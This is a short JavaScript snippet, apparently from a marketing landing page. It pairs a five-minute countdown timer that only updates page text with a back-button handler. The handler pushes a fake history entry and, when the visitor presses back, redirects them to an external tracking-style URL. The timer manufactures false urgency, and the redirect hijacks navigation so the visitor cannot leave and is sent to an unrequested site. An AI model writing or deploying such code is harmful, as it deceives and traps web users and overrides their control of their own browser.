// ===== Countdown Timer (5 minutes) =====
let time = 300;
const timerEl = document.getElementById("timer");

if (timerEl) {
  setInterval(() => {
    let minutes = Math.floor(time / 60);
    let seconds = time % 60;
    seconds = seconds < 10 ? "0" + seconds : seconds;
    timerEl.innerHTML = `${minutes}:${seconds}`;
    if (time > 0) time--;
  }, 1000);
}

// ===== Back Button Redirect =====
history.pushState(null, null, location.href);

window.onpopstate = function () {
  window.location.href =
    "https://www.af9m8trk.com/U8Y11VZ6/SUM122L1/?s1=joy1";
};
